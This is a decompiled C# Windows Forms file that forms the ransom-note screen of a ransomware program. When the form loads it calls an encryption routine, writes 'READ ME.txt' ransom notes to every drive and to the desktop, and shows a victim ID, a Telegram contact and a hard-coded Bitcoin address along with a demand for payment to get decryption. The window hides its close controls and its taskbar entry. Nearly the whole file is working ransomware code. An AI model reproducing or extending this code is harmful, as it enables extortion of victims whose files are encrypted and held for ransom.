using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SF;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Label label3;

	private Button button1;

	private TextBox textBox2;

	public static string Message { get; } = "All your data has been locked us. You want to return? Write Telegram: https://t.me/tony_montana10928 or @tony_montana10928 ";

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string text = Encryption.Run();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text2 in array)
		{
			try
			{
				File.WriteAllText(text2 + "\\READ ME.txt", Message + " Your personal ID KEY: " + text);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			File.WriteAllText(Main.DesktopDirectory + "\\READ ME.txt", Message + " Your personal ID KEY: " + text);
		}
		catch (Exception)
		{
		}
		((Control)textBox1).Text = text;
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)textBox1).Text);
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Expected O, but got Unknown
		//IL_027d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		//IL_04b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04bc: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		label3 = new Label();
		button1 = new Button();
		textBox2 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font("Microsoft Sans Serif", 25.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label1).ForeColor = Color.DarkRed;
		((Control)label1).Location = new Point(461, 9);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(221, 39);
		((Control)label1).TabIndex = 0;
		((Control)label1).Text = "Security tips";
		label1.TextAlign = (ContentAlignment)2;
		((Control)label2).AutoSize = true;
		((Control)label2).Font = new Font("Microsoft Sans Serif", 13.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label2).ForeColor = Color.DarkRed;
		((Control)label2).Location = new Point(14, 69);
		((Control)label2).Name = "label2";
		((Control)label2).Size = new Size(1076, 240);
		((Control)label2).TabIndex = 1;
		((Control)label2).Text = componentResourceManager.GetString("label2.Text");
		((Control)label2).Click += label2_Click;
		((Control)textBox1).BackColor = Color.Black;
		((TextBoxBase)textBox1).BorderStyle = (BorderStyle)1;
		((Control)textBox1).ForeColor = Color.Orange;
		((Control)textBox1).Location = new Point(19, 140);
		((Control)textBox1).Name = "textBox1";
		((TextBoxBase)textBox1).ReadOnly = true;
		((Control)textBox1).Size = new Size(1368, 19);
		((Control)textBox1).TabIndex = 2;
		((Control)textBox1).TextChanged += textBox1_TextChanged;
		((Control)label3).AutoSize = true;
		((Control)label3).Font = new Font("Microsoft Sans Serif", 13.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label3).ForeColor = Color.DarkRed;
		((Control)label3).Location = new Point(14, 389);
		((Control)label3).Name = "label3";
		((Control)label3).Size = new Size(1138, 48);
		((Control)label3).TabIndex = 3;
		((Control)label3).Text = "You have to pay for decryption in Bitcoins. The price depends on how you write to us. After payment we will send you the\r\ndecryption tool that will decrypt all your files.";
		((Control)button1).Location = new Point(615, 168);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(196, 49);
		((Control)button1).TabIndex = 14;
		((Control)button1).Text = "Сopy to clipboard";
		((ButtonBase)button1).UseVisualStyleBackColor = true;
		((Control)button1).Click += button1_Click;
		((Control)textBox2).Location = new Point(626, 289);
		((Control)textBox2).Name = "textBox2";
		((TextBoxBase)textBox2).ReadOnly = true;
		((Control)textBox2).Size = new Size(338, 19);
		((Control)textBox2).TabIndex = 15;
		((Control)textBox2).Text = "19VDobG8akrbtM3VRJAGREJbKqxKB3WvM2";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(7f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = SystemColors.WindowText;
		((Form)this).ClientSize = new Size(1366, 576);
		((Form)this).ControlBox = false;
		((Control)this).Controls.Add((Control)(object)textBox2);
		((Control)this).Controls.Add((Control)(object)button1);
		((Control)this).Controls.Add((Control)(object)label3);
		((Control)this).Controls.Add((Control)(object)textBox1);
		((Control)this).Controls.Add((Control)(object)label2);
		((Control)this).Controls.Add((Control)(object)label1);
		((Control)this).Font = new Font("Microsoft Sans Serif", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)this).ForeColor = Color.DarkRed;
		((Form)this).FormBorderStyle = (FormBorderStyle)5;
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = "Form1";
		((Form)this).ShowIcon = false;
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)1;
		((Form)this).Load += Form1_Load;
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
